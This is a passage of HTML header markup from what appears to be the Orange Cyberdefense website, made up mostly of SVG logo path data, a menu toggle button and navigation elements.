1.57 9.58 4.71 2.46 3.14 3.69 7.19 3.69 12.15 0 5-1.22 9.07-3.66 12.21-2.44 3.14-5.66 4.71-9.67 4.71-5.21 0-8.7-1.65-10.48-4.96h-.12v4.09h-8.37v-44.27h8.81zm-.31 28.27c0 3.1.68 5.58 2.05 7.44 1.36 1.86 3.18 2.79 5.46 2.79 2.23 0 4.04-.91 5.42-2.73 1.38-1.82 2.08-4.32 2.08-7.5 0-3.14-.67-5.64-2.02-7.5-1.34-1.86-3.19-2.79-5.55-2.79-2.32 0-4.13.95-5.46 2.85-1.32 1.9-1.98 4.38-1.98 7.44zM170.03 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.74 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.48-1.32 5.18-1.98 8.08-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM209.52 112.51c.74 0 1.38.1 1.92.31V121c-.95-.21-2.01-.31-3.16-.31-5.79 0-8.68 3.43-8.68 10.29v14.45h-8.8v-32.05h8.37v5.95h.12c.87-2.07 2.24-3.72 4.12-4.96 1.88-1.24 3.92-1.86 6.11-1.86zM245.66 101.17v44.27h-8.37v-4.09h-.12c-1.9 3.31-5.15 4.96-9.73 4.96-4.42 0-7.93-1.61-10.51-4.84-2.58-3.22-3.88-7.34-3.88-12.34 0-4.88 1.31-8.87 3.94-11.97 2.62-3.1 6.04-4.65 10.26-4.65 1.94 0 3.77.4 5.49 1.21 1.71.81 3.05 1.99 4 3.56h.12v-16.12h8.8zm-23.8 28.21c0 2.93.69 5.38 2.08 7.35 1.38 1.96 3.27 2.95 5.67 2.95 2.52 0 4.41-.92 5.67-2.76 1.26-1.84 1.89-4.37 1.89-7.59s-.66-5.72-1.98-7.5c-1.32-1.78-3.2-2.67-5.64-2.67-2.52 0-4.43.93-5.73 2.79-1.31 1.85-1.96 4.33-1.96 7.43zM267.12 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.74 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.32 5.18-1.98 8.08-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM300.53 101.17c.74 0 2.29.08 4.65.25v6.57c-1.16-.12-2.21-.19-3.16-.19-1.28 0-2.17.28-2.67.84-.5.56-.74 1.52-.74 2.88v1.86h6.08v5.89h-6.08v26.16h-8.8v-26.16h-5.27v-5.89h5.27v-2.36c0-3.14.94-5.57 2.82-7.29 1.88-1.7 4.51-2.56 7.9-2.56zM323.35 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.2 3.44 5.55 6.11 1.34 2.67 2.01 5.74 2.01 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.5-1.32 5.2-1.98 8.09-1.98zm6.76 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM362.53 112.51c4.09 0 7.06 1.03 8.9 3.1 1.84 2.07 2.76 5.35 2.76 9.86v19.96h-8.8v-18.17c0-2.64-.42-4.61-1.27-5.89-.85-1.28-2.3-1.92-4.37-1.92-2.4 0-4.13.72-5.21 2.17s-1.61 3.82-1.61 7.13v16.68h-8.8v-32.05h8.37v4.46h.19c2.18-3.55 5.46-5.33 9.84-5.33zM394.03 112.51c4.3 0 7.66.87 10.08 2.6 2.42 1.74 3.77 4.28 4.06 7.63h-8.37c-.12-1.53-.68-2.63-1.67-3.32-.99-.68-2.44-1.02-4.34-1.02-1.65 0-2.88.25-3.69.74-.81.5-1.21 1.24-1.21 2.23 0 .74.27 1.36.81 1.86s1.35.93 2.45 1.3c1.09.37 2.3.68 3.63.93 4.01.79 6.84 1.59 8.49 2.42 1.65.83 2.86 1.82 3.63 2.98.76 1.16 1.15 2.58 1.15 4.28 0 3.6-1.31 6.36-3.94 8.28-2.62 1.92-6.19 2.88-10.69 2.88-4.71 0-8.38-1.01-11-3.04-2.63-2.02-3.98-4.77-4.06-8.25h8.37c0 1.65.64 2.97 1.92 3.94 1.28.97 2.89 1.46 4.84 1.46 1.65 0 3.03-.36 4.12-1.09 1.09-.72 1.64-1.72 1.64-3.01 0-.83-.34-1.51-1.02-2.05-.68-.54-1.64-1.01-2.88-1.43-1.24-.41-3.16-.89-5.77-1.43-2.07-.41-3.91-.97-5.52-1.67-1.61-.7-2.84-1.62-3.69-2.76-.85-1.14-1.27-2.53-1.27-4.18 0-2.11.51-3.95 1.52-5.52 1.01-1.57 2.56-2.76 4.65-3.56 2.06-.79 4.66-1.2 7.76-1.2zM429 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.01 5.74 2.01 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95H444c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.32 5.19-1.98 8.09-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31z"/></g></svg>
    </span>
  </span>
</a>
-->
    </h1>


    <button class="menutoggle js-menutoggle">
      <span class="menutoggle__bar menutoggle__bar--top"></span>
      <span class="menutoggle__bar menutoggle__bar--middle"></span>
      <span class="menutoggle__bar menutoggle__bar--bottom"></span>
    </button>

    <!-- #site-navigation -->
    



























































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































<nav id="site-navigation" class="mainnav" role="navigation">



  <ul id="menu-main-menu" class="mainmenu">
    <li class="mainmenu__item mainmenu__item--home">
      


  


<div class="logo">
            <a href="/">
                <div class="master-logo">
					<!--<svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 283.46 283.46"><defs><style>.cls-1{fill:#ff7900;}.cls-2{fill:#fff;}</style></defs><title>Master_Logo_RGB</title><rect class="cls-1" width="283.46" height="283.46"/><path class="cls-2" d="M111.2,256a23.23,23.23,0,0,1-13,3.92c-7.36,0-11.71-4.9-11.71-11.46,0-8.83,8.12-13.51,24.85-15.4v-2.19c0-2.87-2.18-4.53-6.2-4.53a11.76,11.76,0,0,0-9.61,4.53l-7-4q5.52-7.71,16.82-7.7c10.28,0,16,4.45,16,11.7,0,0,0,28.52,0,28.6h-9.2Zm-14.55-8.3c0,2.65,1.67,5.13,4.68,5.13,3.27,0,6.44-1.36,9.62-4.16v-9.34C101.25,240.56,96.65,243.05,96.65,247.72Z"/><path class="cls-2" d="M129.54,221.07l8.59-1.19.94,4.68c4.85-3.55,8.7-5.44,13.55-5.44,8.12,0,12.3,4.31,12.3,12.84v27.47H154.55V233.77c0-4.83-1.26-7-5-7-3.1,0-6.19,1.43-9.71,4.38v28.3H129.54Z"/><path class="cls-2" d="M233.69,260.18c-11.63,0-18.57-7.47-18.57-20.45s7-20.61,18.4-20.61,18.15,7.25,18.15,20.08c0,.68-.08,1.36-.08,2H225.32c.08,7.47,3.18,11.24,9.29,11.24,3.93,0,6.52-1.58,8.95-5l7.61,4.22C247.82,257.24,241.8,260.18,233.69,260.18Zm7.78-25.66c0-5.28-3-8.38-7.95-8.38-4.68,0-7.61,3-8,8.38Z"/><path class="cls-2" d="M34.89,260.61c-10.27,0-19.52-6.54-19.52-20.82S24.62,219,34.89,219s19.52,6.55,19.52,20.82S45.15,260.61,34.89,260.61Zm0-32.86c-7.75,0-9.19,7-9.19,12s1.44,12.05,9.19,12.05,9.19-7,9.19-12.05S42.64,227.75,34.89,227.75Z"/><path class="cls-2" d="M61.53,220H71.4v4.64a15.29,15.29,0,0,1,10.87-5.45,8.6,8.6,0,0,1,1.34.07V229h-.5c-4.52,0-9.46.7-11,4.21v26.24H61.53Z"/><path class="cls-2" d="M190.34,251c7.88-.06,8.54-8.07,8.54-13.31,0-6.16-3-11.18-8.61-11.18-3.73,0-7.89,2.72-7.89,11.61C182.38,243,182.72,251.05,190.34,251Zm18.52-31.12v37.35c0,6.6-.5,17.45-19.31,17.57-7.75,0-14.94-3.05-16.38-9.83l10.25-1.65c.43,1.94,1.61,3.88,7.42,3.88,5.39,0,8-2.58,8-8.75v-4.59l-.14-.14c-1.65,2.94-4.16,5.74-10.19,5.74-9.19,0-16.44-6.38-16.44-19.72,0-13.19,7.47-20.57,15.86-20.58,7.87,0,10.79,3.57,11.46,5.46l-.12,0,.85-4.72Z"/><path class="cls-2" d="M255.75,206.79h-4.08v11.3h-2.16v-11.3h-4.08v-1.74h10.32Zm17,11.3h-2.15V207.2h-.07l-4.27,10.89h-1.36l-4.27-10.89h-.06v10.89h-2.15v-13h3.32l3.89,9.9,3.83-9.9h3.29Z"/></svg>-->
					<img src="/img/master-logo.svg" alt="Orange Cyberdefense">
				</div>
                <div class="master-logo-small"><img src="/images/orange-logo-small.svg" alt=""></div>
                <div class="logo-text">
				<!--	<svg version="1.1" id="Calque_1" xmlns="http://www.w3.org/2000/svg" x="0" y="0" viewBox="0 0 480.83 190.83" xml:space="preserve" width="481" height="191"><style>.st0{fill:#ff7900}</style><g><path class="st0" d="M59.98 38.11c6.53 0 11.79 2.17 15.78 6.51s5.98 9.96 5.98 16.86c0 6.74-2.01 12.26-6.01 16.55-4.01 4.3-9.26 6.45-15.75 6.45-6.53 0-11.79-2.15-15.78-6.45-3.99-4.3-5.98-9.82-5.98-16.55 0-6.86 2-12.47 6.01-16.83 4.01-4.36 9.26-6.54 15.75-6.54zM47.95 61.49c0 4.46 1.05 8.05 3.16 10.76 2.11 2.71 5.06 4.06 8.87 4.06 3.72 0 6.65-1.33 8.8-4C70.93 69.64 72 66.03 72 61.49c0-4.75-1.06-8.47-3.19-11.16-2.13-2.69-5.09-4.03-8.9-4.03-3.72 0-6.64 1.34-8.77 4.03-2.13 2.68-3.19 6.4-3.19 11.16zM106.17 50.51c.74 0 1.38.1 1.92.31V59c-.95-.21-2.01-.31-3.16-.31-5.79 0-8.68 3.43-8.68 10.29v14.45h-8.8V51.38h8.37v5.95h.12c.87-2.07 2.24-3.72 4.12-4.96 1.88-1.24 3.92-1.86 6.11-1.86zM125.39 50.51c9.34.04 14.01 3.08 14.01 9.11v16.99c0 3.14.37 5.42 1.12 6.82h-8.93c-.33-.99-.54-2.02-.62-3.1-2.6 2.65-6.2 3.97-10.79 3.97-3.35 0-6-.85-7.97-2.54-1.96-1.69-2.95-4.05-2.95-7.07 0-2.93.93-5.21 2.79-6.82 1.9-1.69 5.35-2.77 10.35-3.22 3.55-.37 5.81-.84 6.76-1.39.95-.56 1.43-1.42 1.43-2.57 0-1.45-.43-2.52-1.3-3.22-.87-.7-2.32-1.05-4.34-1.05-1.86 0-3.27.38-4.22 1.15-.95.77-1.51 1.99-1.67 3.69h-8.8c.21-3.51 1.65-6.18 4.34-8 2.68-1.84 6.28-2.75 10.79-2.75zm-7.32 23.81c0 2.73 1.8 4.09 5.39 4.09 4.71-.04 7.09-2.46 7.13-7.25v-3.41c-.7.7-2.48 1.22-5.33 1.55-2.48.29-4.3.8-5.46 1.52-1.15.72-1.73 1.89-1.73 3.5zM164.63 50.51c4.09 0 7.06 1.03 8.9 3.1 1.84 2.07 2.76 5.35 2.76 9.86v19.96h-8.8V65.27c0-2.64-.42-4.61-1.27-5.89-.85-1.28-2.3-1.92-4.37-1.92-2.4 0-4.13.72-5.21 2.17s-1.61 3.82-1.61 7.13v16.68h-8.8V51.38h8.37v4.46h.19c2.17-3.55 5.46-5.33 9.84-5.33zM195.75 50.51c4.42 0 7.6 1.72 9.55 5.15h.12v-4.28h8.37v30.07c0 4.63-1.44 8.14-4.31 10.54-2.87 2.4-6.95 3.6-12.25 3.6-4.05 0-7.39-.97-10.01-2.91-2.63-1.94-4.02-4.4-4.19-7.38h8.74c.7 2.93 2.89 4.4 6.57 4.4 2.27 0 4.02-.67 5.24-2.01 1.22-1.34 1.83-3.25 1.83-5.74v-4.4h-.12c-.87 1.57-2.14 2.79-3.81 3.66-1.67.87-3.61 1.3-5.8 1.3-4.3 0-7.66-1.41-10.08-4.22-2.42-2.81-3.63-6.78-3.63-11.9 0-4.55 1.27-8.33 3.81-11.35 2.57-3.02 5.88-4.53 9.97-4.53zm-4.96 15.75c0 3.02.63 5.37 1.89 7.07 1.26 1.7 3.01 2.54 5.24 2.54 2.27 0 4.09-.82 5.46-2.45 1.36-1.63 2.05-3.79 2.05-6.48 0-3.22-.65-5.66-1.95-7.32-1.3-1.65-3.17-2.48-5.61-2.48-2.27 0-4.02.86-5.24 2.57-1.23 1.73-1.84 3.91-1.84 6.55zM235.68 50.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.73 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.31 5.19-1.98 8.08-1.98zm6.76 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31z"/><path d="M59.98 100.11c5.17 0 9.51 1.46 13.02 4.37s5.54 6.77 6.08 11.56h-9.42c-.33-2.19-1.43-4.03-3.29-5.52-1.86-1.49-3.99-2.23-6.39-2.23-3.8 0-6.76 1.36-8.87 4.09-2.11 2.73-3.16 6.43-3.16 11.1 0 4.55 1.06 8.15 3.19 10.82s5.07 4 8.83 4c2.81 0 5.08-.86 6.82-2.57 1.74-1.71 2.81-4.16 3.22-7.35h9.42c-.5 5.62-2.51 10.04-6.04 13.27-3.53 3.22-8.01 4.84-13.42 4.84-6.49 0-11.74-2.14-15.75-6.42-4.01-4.28-6.01-9.81-6.01-16.58 0-6.86 1.98-12.47 5.95-16.83 3.97-4.37 9.24-6.55 15.82-6.55zM90.85 113.38l7.25 21.95h.12l7.01-21.95h9.11l-13.39 36.08c-.95 2.52-2.26 4.36-3.94 5.52-1.67 1.16-4 1.74-6.98 1.74-1.28 0-3.12-.1-5.52-.31v-7.25c1.57.21 3.12.31 4.65.31 1.24 0 2.2-.38 2.88-1.15.68-.76 1.02-1.73 1.02-2.88 0-.66-.12-1.32-.37-1.98l-11.28-30.07h9.44zM126.13 101.17v16.12h.12c.95-1.45 2.3-2.6 4.06-3.47 1.76-.87 3.77-1.3 6.04-1.3 3.93 0 7.12 1.57 9.58 4.71 2.46 3.14 3.69 7.19 3.69 12.15 0 5-1.22 9.07-3.66 12.21-2.44 3.14-5.66 4.71-9.67 4.71-5.21 0-8.7-1.65-10.48-4.96h-.12v4.09h-8.37v-44.27h8.81zm-.31 28.27c0 3.1.68 5.58 2.05 7.44 1.36 1.86 3.18 2.79 5.46 2.79 2.23 0 4.04-.91 5.42-2.73 1.38-1.82 2.08-4.32 2.08-7.5 0-3.14-.67-5.64-2.02-7.5-1.34-1.86-3.19-2.79-5.55-2.79-2.32 0-4.13.95-5.46 2.85-1.32 1.9-1.98 4.38-1.98 7.44zM170.03 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.74 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.48-1.32 5.18-1.98 8.08-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM209.52 112.51c.74 0 1.38.1 1.92.31V121c-.95-.21-2.01-.31-3.16-.31-5.79 0-8.68 3.43-8.68 10.29v14.45h-8.8v-32.05h8.37v5.95h.12c.87-2.07 2.24-3.72 4.12-4.96 1.88-1.24 3.92-1.86 6.11-1.86zM245.66 101.17v44.27h-8.37v-4.09h-.12c-1.9 3.31-5.15 4.96-9.73 4.96-4.42 0-7.93-1.61-10.51-4.84-2.58-3.22-3.88-7.34-3.88-12.34 0-4.88 1.31-8.87 3.94-11.97 2.62-3.1 6.04-4.65 10.26-4.65 1.94 0 3.77.4 5.49 1.21 1.71.81 3.05 1.99 4 3.56h.12v-16.12h8.8zm-23.8 28.21c0 2.93.69 5.38 2.08 7.35 1.38 1.96 3.27 2.95 5.67 2.95 2.52 0 4.41-.92 5.67-2.76 1.26-1.84 1.89-4.37 1.89-7.59s-.66-5.72-1.98-7.5c-1.32-1.78-3.2-2.67-5.64-2.67-2.52 0-4.43.93-5.73 2.79-1.31 1.85-1.96 4.33-1.96 7.43zM267.12 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.74 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.32 5.18-1.98 8.08-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM300.53 101.17c.74 0 2.29.08 4.65.25v6.57c-1.16-.12-2.21-.19-3.16-.19-1.28 0-2.17.28-2.67.84-.5.56-.74 1.52-.74 2.88v1.86h6.08v5.89h-6.08v26.16h-8.8v-26.16h-5.27v-5.89h5.27v-2.36c0-3.14.94-5.57 2.82-7.29 1.88-1.7 4.51-2.56 7.9-2.56zM323.35 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.2 3.44 5.55 6.11 1.34 2.67 2.01 5.74 2.01 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.5-1.32 5.2-1.98 8.09-1.98zm6.76 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM362.53 112.51c4.09 0 7.06 1.03 8.9 3.1 1.84 2.07 2.76 5.35 2.76 9.86v19.96h-8.8v-18.17c0-2.64-.42-4.61-1.27-5.89-.85-1.28-2.3-1.92-4.37-1.92-2.4 0-4.13.72-5.21 2.17s-1.61 3.82-1.61 7.13v16.68h-8.8v-32.05h8.37v4.46h.19c2.18-3.55 5.46-5.33 9.84-5.33zM394.03 112.51c4.3 0 7.66.87 10.08 2.6 2.42 1.74 3.77 4.28 4.06 7.63h-8.37c-.12-1.53-.68-2.63-1.67-3.32-.99-.68-2.44-1.02-4.34-1.02-1.65 0-2.88.25-3.69.74-.81.5-1.21 1.24-1.21 2.23 0 .74.27 1.36.81 1.86s1.35.93 2.45 1.3c1.09.37 2.3.68 3.63.93 4.01.79 6.84 1.59 8.49 2.42 1.65.83 2.86 1.82 3.63 2.98.76 1.16 1.15 2.58 1.15 4.28 0 3.6-1.31 6.36-3.94 8.28-2.62 1.92-6.19 2.88-10.69 2.88-4.71 0-8.38-1.01-11-3.04-2.63-2.02-3.98-4.77-4.06-8.25h8.37c0 1.65.64 2.97 1.92 3.94 1.28.97 2.89 1.46 4.84 1.46 1.65 0 3.03-.36 4.12-1.09 1.09-.72 1.64-1.72 1.64-3.01 0-.83-.34-1.51-1.02-2.05-.68-.54-1.64-1.01-2.88-1.43-1.24-.41-3.16-.89-5.77-1.43-2.07-.41-3.91-.97-5.52-1.67-1.61-.7-2.84-1.62-3.69-2.76-.85-1.14-1.27-2.53-1.27-4.18 0-2.11.51-3.95 1.52-5.52 1.01-1.57 2.56-2.76 4.65-3.56 2.06-.79 4.66-1.2 7.76-1.2zM429 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.01 5.74 2.01 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95H444c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.32 5.19-1.98 8.09-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31z"/></g></svg>-->
					<img src="/img/logo-text-x.svg" alt="Orange Cyberdefense">
				</div>
            </a>
</div>
<!--
<a href="/" rel="home" title="Orange Cyberdefense home" class="sp-logo">
  <span class="visuallyhidden">Orange Cyberdefense</span>
  <span class="sp-logo__icon">
    <span class="sp-logo__wrap sp-logo__wrap--icon">
      <svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 283.46 283.46"><defs><style>.cls-1{fill:#ff7900;}.cls-2{fill:#fff;}</style></defs><title>Master_Logo_RGB</title><rect class="cls-1" width="283.46" height="283.46"/><path class="cls-2" d="M111.2,256a23.23,23.23,0,0,1-13,3.92c-7.36,0-11.71-4.9-11.71-11.46,0-8.83,8.12-13.51,24.85-15.4v-2.19c0-2.87-2.18-4.53-6.2-4.53a11.76,11.76,0,0,0-9.61,4.53l-7-4q5.52-7.71,16.82-7.7c10.28,0,16,4.45,16,11.7,0,0,0,28.52,0,28.6h-9.2Zm-14.55-8.3c0,2.65,1.67,5.13,4.68,5.13,3.27,0,6.44-1.36,9.62-4.16v-9.34C101.25,240.56,96.65,243.05,96.65,247.72Z"/><path class="cls-2" d="M129.54,221.07l8.59-1.19.94,4.68c4.85-3.55,8.7-5.44,13.55-5.44,8.12,0,12.3,4.31,12.3,12.84v27.47H154.55V233.77c0-4.83-1.26-7-5-7-3.1,0-6.19,1.43-9.71,4.38v28.3H129.54Z"/><path class="cls-2" d="M233.69,260.18c-11.63,0-18.57-7.47-18.57-20.45s7-20.61,18.4-20.61,18.15,7.25,18.15,20.08c0,.68-.08,1.36-.08,2H225.32c.08,7.47,3.18,11.24,9.29,11.24,3.93,0,6.52-1.58,8.95-5l7.61,4.22C247.82,257.24,241.8,260.18,233.69,260.18Zm7.78-25.66c0-5.28-3-8.38-7.95-8.38-4.68,0-7.61,3-8,8.38Z"/><path class="cls-2" d="M34.89,260.61c-10.27,0-19.52-6.54-19.52-20.82S24.62,219,34.89,219s19.52,6.55,19.52,20.82S45.15,260.61,34.89,260.61Zm0-32.86c-7.75,0-9.19,7-9.19,12s1.44,12.05,9.19,12.05,9.19-7,9.19-12.05S42.64,227.75,34.89,227.75Z"/><path class="cls-2" d="M61.53,220H71.4v4.64a15.29,15.29,0,0,1,10.87-5.45,8.6,8.6,0,0,1,1.34.07V229h-.5c-4.52,0-9.46.7-11,4.21v26.24H61.53Z"/><path class="cls-2" d="M190.34,251c7.88-.06,8.54-8.07,8.54-13.31,0-6.16-3-11.18-8.61-11.18-3.73,0-7.89,2.72-7.89,11.61C182.38,243,182.72,251.05,190.34,251Zm18.52-31.12v37.35c0,6.6-.5,17.45-19.31,17.57-7.75,0-14.94-3.05-16.38-9.83l10.25-1.65c.43,1.94,1.61,3.88,7.42,3.88,5.39,0,8-2.58,8-8.75v-4.59l-.14-.14c-1.65,2.94-4.16,5.74-10.19,5.74-9.19,0-16.44-6.38-16.44-19.72,0-13.19,7.47-20.57,15.86-20.58,7.87,0,10.79,3.57,11.46,5.46l-.12,0,.85-4.72Z"/><path class="cls-2" d="M255.75,206.79h-4.08v11.3h-2.16v-11.3h-4.08v-1.74h10.32Zm17,11.3h-2.15V207.2h-.07l-4.27,10.89h-1.36l-4.27-10.89h-.06v10.89h-2.15v-13h3.32l3.89,9.9,3.83-9.9h3.29Z"/></svg>
    </span>
  </span>

  <span class="sp-logo__text ">
    <span class="sp-logo__wrap sp-logo__wrap--text">
      <svg version="1.1" id="Calque_1" xmlns="http://www.w3.org/2000/svg" x="0" y="0" viewBox="0 0 480.83 190.83" xml:space="preserve" width="481" height="191"><style>.st0{fill:#ff7900}</style><g><path class="st0" d="M59.98 38.11c6.53 0 11.79 2.17 15.78 6.51s5.98 9.96 5.98 16.86c0 6.74-2.01 12.26-6.01 16.55-4.01 4.3-9.26 6.45-15.75 6.45-6.53 0-11.79-2.15-15.78-6.45-3.99-4.3-5.98-9.82-5.98-16.55 0-6.86 2-12.47 6.01-16.83 4.01-4.36 9.26-6.54 15.75-6.54zM47.95 61.49c0 4.46 1.05 8.05 3.16 10.76 2.11 2.71 5.06 4.06 8.87 4.06 3.72 0 6.65-1.33 8.8-4C70.93 69.64 72 66.03 72 61.49c0-4.75-1.06-8.47-3.19-11.16-2.13-2.69-5.09-4.03-8.9-4.03-3.72 0-6.64 1.34-8.77 4.03-2.13 2.68-3.19 6.4-3.19 11.16zM106.17 50.51c.74 0 1.38.1 1.92.31V59c-.95-.21-2.01-.31-3.16-.31-5.79 0-8.68 3.43-8.68 10.29v14.45h-8.8V51.38h8.37v5.95h.12c.87-2.07 2.24-3.72 4.12-4.96 1.88-1.24 3.92-1.86 6.11-1.86zM125.39 50.51c9.34.04 14.01 3.08 14.01 9.11v16.99c0 3.14.37 5.42 1.12 6.82h-8.93c-.33-.99-.54-2.02-.62-3.1-2.6 2.65-6.2 3.97-10.79 3.97-3.35 0-6-.85-7.97-2.54-1.96-1.69-2.95-4.05-2.95-7.07 0-2.93.93-5.21 2.79-6.82 1.9-1.69 5.35-2.77 10.35-3.22 3.55-.37 5.81-.84 6.76-1.39.95-.56 1.43-1.42 1.43-2.57 0-1.45-.43-2.52-1.3-3.22-.87-.7-2.32-1.05-4.34-1.05-1.86 0-3.27.38-4.22 1.15-.95.77-1.51 1.99-1.67 3.69h-8.8c.21-3.51 1.65-6.18 4.34-8 2.68-1.84 6.28-2.75 10.79-2.75zm-7.32 23.81c0 2.73 1.8 4.09 5.39 4.09 